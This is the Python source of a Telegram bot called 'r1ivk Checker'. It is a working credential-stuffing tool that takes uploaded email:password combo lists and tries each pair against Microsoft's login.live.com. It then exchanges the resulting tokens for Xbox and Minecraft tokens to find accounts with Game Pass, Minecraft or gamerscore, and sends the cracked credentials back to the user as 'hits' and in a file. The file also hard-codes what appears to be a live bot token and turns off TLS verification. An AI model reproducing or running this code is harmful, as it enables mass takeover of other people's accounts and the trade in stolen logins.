# -*- coding: utf-8 -*-
"""
r1ivk Checker ⚡ - Telegram Bot Version (File Output Pro)
"""

import os
import re
import time
import requests
import urllib3
from urllib.parse import urlparse, parse_qs
from requests.adapters import HTTPAdapter
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.fsm.storage.memory import MemoryStorage

urllib3.disable_warnings()

TELEGRAM_BOT_TOKEN = "8896382526:AAEySaJWfg6pQpoRuSu8zQaG50uJ_Jf0obg"

bot = Bot(token=TELEGRAM_BOT_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(storage=storage)

def extract_ppft(text):
    patterns = [
        r'name="PPFT"[^>]*value="([^"]+)"',
        r'value="([^"]+)"[^>]*name="PPFT"',
        r'"PPFT":"([^"]+)"',
        r'"sFTTag":"<input[^>]*value=\\"([^\\"]+)\\"',
    ]
    for pattern in patterns:
        match = re.search(pattern, text, re.IGNORECASE)
        if match:
            token = match.group(1)
            token = token.replace('\\/', '/').replace('\\"', '"').replace('\\x26', '&')
            return token
    return None

def extract_url_post(text):
    patterns = [
        r'"urlPost":"([^"]+)"',
        r"urlPost:'([^']+)'",
        r'id="fmHF"\s+action="([^"]+)"',
        r'action="([^"]+)"[^>]*id="fmHF"',
    ]
    for pattern in patterns:
        match = re.search(pattern, text, re.IGNORECASE)
        if match:
            url = match.group(1)
            url = url.replace('\\/', '/')
            return url
    return None

def check_single_account(combo):
    parts = combo.split(':')
    if len(parts) < 2:
        return {'status': 'bad'}

    email = parts[0].strip()
    password = ':'.join(parts[1:]).strip()
    adapter = HTTPAdapter(pool_connections=10, pool_maxsize=10)

    session = requests.Session()
    session.verify = False
    session.mount('https://', adapter)
    session.mount('http://', adapter)
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
    })

    try:
        sftag_url = (
            "https://login.live.com/oauth20_authorize.srf"
            "?client_id=00000000402B5328"
            "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
            "&scope=service::user.auth.xboxlive.com::MBI_SSL"
            "&display=touch&response_type=token&locale=en"
        )
        resp = session.get(sftag_url, timeout=15)
        text = resp.text

        sftag = extract_ppft(text)
        url_post = extract_url_post(text)

        if not sftag or not url_post:
            session.close()
            return {'status': 'bad'}

        login_data = {
            'login': email, 'loginfmt': email, 'passwd': password,
            'PPFT': sftag, 'type': '11', 'NewUser': '1', 'LoginOptions': '3', 'i19': '0',
        }
        headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Referer': sftag_url, 'Origin': 'https://login.live.com'}
        login_req = session.post(url_post, data=login_data, headers=headers, allow_redirects=True, timeout=15)

        ms_token = None
        login_text = login_req.text.lower()

        if 'access_token' in login_req.url:
            ms_token = parse_qs(urlparse(login_req.url).fragment).get('access_token', [None])[0]
        elif 'access_token' in login_text:
            token_match = re.search(r'access_token=([^&\s\"\']+)', login_text)
            if token_match:
                ms_token = token_match.group(1)
        elif any(x in login_text for x in ["password is incorrect", "account doesn't exist", "passwords don't match", "that password is incorrect"]):
            session.close()
            return {'status': 'bad'}
        elif any(x in login_text for x in ["recover", "identity/confirm", "locked", "help us protect", "verify your identity", "security challenge", "two-step"]):
            session.close()
            return {'status': 'twofa', 'email': email}

        if not ms_token:
            session.close()
            return {'status': 'bad'}

        xb_payload = {"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}
        xb_headers = {'Content-Type': 'application/json', 'Accept': 'application/json'}
        xb_req = session.post('https://user.auth.xboxlive.com/user/authenticate', json=xb_payload, headers=xb_headers, timeout=15)

        if xb_req.status_code != 200:
            session.close()
            return {'status': 'bad'}

        xb_token = xb_req.json()['Token']
        uhs = xb_req.json()['DisplayClaims']['xui'][0]['uhs']

        gamertag = "N/A"
        gamerscore = "0"
        gscore_int = 0

        try:
            xsts_xb_payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]}, "RelyingParty": "http://xboxlive.com", "TokenType": "JWT"}
            xsts_xb_req = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_xb_payload, headers=xb_headers, timeout=15)
            if xsts_xb_req.status_code == 200:
                xsts_xb_token = xsts_xb_req.json()['Token']
                prof_req = session.get("https://profile.xboxlive.com/users/me/profile/settings?settings=Gamertag,Gamerscore", 
                                       headers={"Authorization": f"XBL3.0 x={uhs};{xsts_xb_token}", "x-xbl-contract-version": "2"}, timeout=15)
                if prof_req.status_code == 200:
                    settings = prof_req.json().get('profileUsers', [{}])[0].get('settings', [])
                    for s in settings:
                        if s['id'] == 'Gamertag': gamertag = s['value']
                        if s['id'] == 'Gamerscore': 
                            gamerscore = s['value']
                            try: gscore_int = int(gamerscore)
                            except: gscore_int = 0
        except:
            pass

        has_gp = False
        has_mc = False
        gp_type = ""
        mc_ent_text = ""

        try:
            xsts_mc_payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]}, "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}
            xsts_mc_req = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_mc_payload, headers=xb_headers, timeout=15)
            if xsts_mc_req.status_code == 200:
                xsts_mc_token = xsts_mc_req.json()['Token']
                mc_auth = session.post('https://api.minecraftservices.com/authentication/login_with_xbox', 
                                       json={'identityToken': f"XBL3.0 x={uhs};{xsts_mc_token}"}, 
                                       headers={'Content-Type': 'application/json'}, timeout=15)
                if mc_auth.status_code == 200:
                    mc_token = mc_auth.json().get('access_token')
                    if mc_token:
                        ent_req = session.get('https://api.minecraftservices.com/entitlements/mcstore', headers={'Authorization': f'Bearer {mc_token}'}, timeout=15)
                        if ent_req.status_code == 200:
                            mc_ent_text = ent_req.text
        except:
            pass

        if 'product_game_pass_ultimate' in mc_ent_text:
            gp_type = "Game Pass Ultimate"
            has_gp = True
        elif 'product_game_pass_pc' in mc_ent_text:
            gp_type = "PC Game Pass"
            has_gp = True
        elif 'product_game_pass_console' in mc_ent_text:
            gp_type = "Xbox Game Pass Console"
            has_gp = True

        has_mc = 'product_minecraft' in mc_ent_text
        session.close()

        if has_gp or has_mc or gscore_int > 0:
            return {
                'status': 'hit',
                'email': email,
                'password': password,
                'gamertag': gamertag,
                'gamerscore': gamerscore,
                'minecraft': 'Yes' if has_mc else 'No',
                'gamepass': gp_type if has_gp else 'No'
            }
        else:
            return {'status': 'bad'}

    except Exception:
        return {'status': 'error'}

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    await message.answer(
        "⚡ *r1ivk Checker ⚡*\n\n"
        "Welcome! Send your combo file (`.txt`) with `email:password` format to start checking.",
        parse_mode="Markdown"
    )

@dp.message(F.document)
async def handle_document(message: types.Message):
    document = message.document
    if not document.file_name.endswith('.txt'):
        await message.reply("Please send a valid `.txt` file!")
        return

    file_info = await bot.get_file(document.file_id)
    downloaded_file = await bot.download_file(file_info.file_path)
    
    combos = []
    for line in downloaded_file.read().decode('utf-8', errors='ignore').splitlines():
        line = line.strip()
        if ':' in line:
            combos.append(line)

    total = len(combos)
    if total == 0:
        await message.reply("The file is empty or invalid!")
        return

    status_msg = await message.reply(
        f"🚀 *Checking Started!*\n\n"
        f"📊 Total Combos: `{total}`\n"
        f"🔍 Checked: `0 / {total}` (0.0%)\n"
        f"🔥 Hits: `0`\n"
        f"❌ Bad: `0`\n"
        f"⏳ Status: In Progress...",
        parse_mode="Markdown"
    )

    checked = 0
    hits = 0
    bad = 0
    hit_lines = []

    for idx, combo in enumerate(combos, 1):
        result = check_single_account(combo)
        checked += 1
        
        if result['status'] == 'hit':
            hits += 1
            hit_data = f"{result['email']}:{result['password']} | Gamertag: {result['gamertag']} | Score: {result['gamerscore']} | MC: {result['minecraft']} | GP: {result['gamepass']}"
            hit_lines.append(hit_data)

            hit_text = (
                f"🔥 *r1ivk Checker - NEW HIT!*\n\n"
                f"📧 Email: `{result['email']}`\n"
                f"🔑 Pass: `{result['password']}`\n"
                f"🎮 Gamertag: `{result['gamertag']}`\n"
                f"🏆 Gamerscore: `{result['gamerscore']}`\n"
                f"⛏️ Minecraft: `{result['minecraft']}`\n"
                f"🎮 Game Pass: `{result['gamepass']}`\n"
                f"⚡ r1ivk Checker"
            )
            await message.answer(hit_text, parse_mode="Markdown")
        else:
            bad += 1

        if idx % 5 == 0 or idx == total:
            percentage = (checked / total) * 100
            try:
                await status_msg.edit_text(
                    f"🚀 *Checking in Progress...*\n\n"
                    f"📊 Total Combos: `{total}`\n"
                    f"🔍 Checked: `{checked} / {total}` ({percentage:.1f}%)\n"
                    f"🔥 Hits: `{hits}`\n"
                    f"❌ Bad: `{bad}`\n"
                    f"⏳ Status: Running",
                    parse_mode="Markdown"
                )
            except:
                pass

        time.sleep(0.3)

    # حفظ الهيتس في ملف نصي وإرساله في النهاية
    file_path = f"hits_{message.from_user.id}.txt"
    with open(file_path, "w", encoding="utf-8") as f:
        f.write("\n".join(hit_lines))

    input_file = types.FSInputFile(file_path)
    await message.answer_document(
        input_file,
        caption=f"✅ *Checking Completed Successfully!* 🎉\n\n"
                f"📊 Total Checked: `{total}`\n"
                f"🔥 Total Hits: `{hits}`\n"
                f"❌ Total Bad: `{bad}`\n"
                f"👑 Owner: r1ivk",
        parse_mode="Markdown"
    )

    # حذف الملف من السيرفر بعد الإرسال لتنظيف المساحة
    if os.path.exists(file_path):
        os.remove(file_path)

if __name__ == "__main__":
    import asyncio
    asyncio.run(dp.start_polling(bot))
